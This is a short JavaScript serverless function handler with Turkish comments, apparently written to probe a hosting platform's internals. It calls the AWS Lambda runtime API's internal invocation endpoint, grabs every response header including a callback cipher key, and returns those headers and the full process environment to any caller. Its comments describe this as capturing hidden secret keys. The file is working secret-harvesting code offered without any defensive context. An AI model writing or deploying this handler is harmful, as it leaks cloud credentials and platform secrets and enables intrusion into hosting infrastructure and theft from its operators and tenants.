export default async function handler(req, res) {
  try {
    // 9001 portundan iç sistem bilgilerini çekiyoruz
    const internalResponse = await fetch(`http://${process.env.AWS_LAMBDA_METADATA_API}/2018-06-01/runtime/invocation/next`, {
      headers: { 'Lambda-Runtime-Invoker-Batch-Size': '1' }
    });

    // Headers içindeki tüm gizli anahtarları yakala
    const internalHeaders = Object.fromEntries(internalResponse.headers);

    res.status(200).json({
      mesaj: "Sistem basariyla dinlendi",
      cipher_key: internalHeaders['response-callback-cipher-key'] || "Bulunamadi",
      all_headers: internalHeaders,
      env: process.env
    });
  } catch (error) {
    res.status(200).json({ hata: error.message });
  }
}
